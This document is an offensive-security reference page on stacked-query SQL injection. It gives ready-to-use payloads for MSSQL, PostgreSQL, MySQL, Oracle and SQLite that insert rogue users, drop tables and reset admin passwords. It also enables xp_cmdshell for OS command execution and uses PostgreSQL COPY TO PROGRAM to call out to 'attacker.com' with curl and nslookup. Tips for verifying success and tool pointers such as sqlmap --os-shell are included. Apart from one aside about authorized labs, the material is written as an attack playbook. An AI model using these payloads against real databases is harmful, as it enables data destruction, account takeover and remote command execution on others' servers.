# Stacked Queries (Multi-Statement Injection)

## When this applies

- Backend driver is configured to allow multiple statements per call (default in MSSQL/PostgreSQL; rare in MySQL/Oracle).
- You have classic SQLi but want to do more than read — INSERT, UPDATE, EXEC stored procs.
- Common with PHP `mssql_query`, .NET `SqlCommand`, Python `psycopg2` with `executescript`, Node `mysql2` with `multipleStatements: true`.

## Technique

Terminate the original statement with `;` and append a new statement. The driver executes both in sequence, returning the first statement's result while the second runs silently (or with side effects).

## Steps

### 1. Microsoft SQL Server / PostgreSQL

```sql
'; INSERT INTO users VALUES ('hacker','password123')--
'; DROP TABLE users--           -- destructive, only in authorized labs
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

### 2. MySQL (rare — usually disabled)

Stacked queries on MySQL require explicit driver flag:
- Node: `mysql2` with `multipleStatements: true`
- PHP: `mysqli_multi_query` instead of `mysqli_query`
- Python: `mysql.connector` with `cursor.execute(query, multi=True)` followed by `for result in cursor: pass` to drain the result set; `cursor.executescript(...)` does NOT exist in `mysql.connector` (only `pymysql` and `sqlite3` have it).

```sql
1'; INSERT INTO users VALUES ('hacker','password123');#
```

Source-side fingerprint for the Python flag: grep for `multi=True` in handler code, or `cursor.execute(...)` calls followed by an iteration loop. Without `multi=True`, mysql.connector raises `InterfaceError: Use multi=True when executing multiple statements`.

### 3. Oracle (PL/SQL block instead)

Oracle does not support `;`-stacked statements but DOES allow PL/SQL blocks:

```sql
'; BEGIN INSERT INTO users VALUES ('hacker','password123'); END;--
```

### 3b. SQLite via Microsoft.Data.Sqlite (.NET / EF Core) — supports stacked queries

Most ADO.NET providers reject `;`-stacked statements. Microsoft.Data.Sqlite is the exception — `FromSqlRaw` / `ExecuteSqlRaw` execute multiple statements in one call.

Source-side fingerprint:
```csharp
ctx.Database.ExecuteSqlRaw($"UPDATE Settings SET Theme='{userInput}' WHERE Id=1");
ctx.Wishlist.FromSqlRaw($"SELECT * FROM Wishlist WHERE Owner='{userInput}'");
```

Exploitation — land a payload on a row another endpoint reads back:
```sql
x'; UPDATE Wishlist SET data='<base64_payload>' WHERE Id=1; --
```

Pairs especially well with Newtonsoft `TypeNameHandling.All` deserialization sinks — see [../../../../server-side/reference/scenarios/deserialization/dotnet-deserialization.md](../../../../server-side/reference/scenarios/deserialization/dotnet-deserialization.md).

### 4. MSSQL: enable + execute `xp_cmdshell`

Stacked queries shine on MSSQL because they unlock OS command execution:

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'--
```

Alternative when `xp_cmdshell` is locked down:

```sql
'; EXEC sp_oacreate 'wscript.shell', @shell OUT;
   EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```

### 5. PostgreSQL: program execution via `COPY`

```sql
'; copy (SELECT '') to program 'nslookup attacker.com'--
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/`whoami`'--
```

Requires PostgreSQL ≥ 9.3 and superuser (or `pg_execute_server_program` role on PG13+).

### 6. Detect support before you need it

Send a benign stacked statement and observe:

```sql
'; SELECT 1--
```

- No error and original query still works → stacked queries supported.
- 500 error mentioning syntax → not supported, stick to UNION/blind.

## Verifying success

- For data-changing queries (INSERT/UPDATE): query the affected row in a separate request and confirm new state.
- For `xp_cmdshell`: combine with file read, OAST, or output redirection to a queryable table:
  ```sql
  ; EXEC xp_cmdshell 'whoami' WITH RESULT SETS ((output VARCHAR(100)))--
  ```
- For PG `COPY ... TO PROGRAM`: hit your DNS/HTTP listener.

## Common pitfalls

- Many ORMs use parameterized queries that disallow stacking by design (Hibernate, SQLAlchemy in default mode). Confirm raw driver behavior before assuming support.
- MySQL with `mysql_query` (PHP) silently ignores everything after the first statement — you'll see no error but the second statement DIDN'T run.
- `xp_cmdshell` is denied by default on modern MSSQL; you need sysadmin or RECONFIGURE permission to enable it.
- PostgreSQL `COPY ... TO PROGRAM` requires server-side filesystem write (or pipe) — fails silently if the role lacks privilege.
- Comments after stacked statements MUST be on the LAST statement; misplaced `--` will comment out subsequent statements you wanted to run.

## Tools

- sqlmap `--os-shell` (auto-detects stacked-query OS command execution).
- Burp Repeater for manual stacking.
- mssqlclient.py / impacket for direct MSSQL shells once `xp_cmdshell` is enabled.
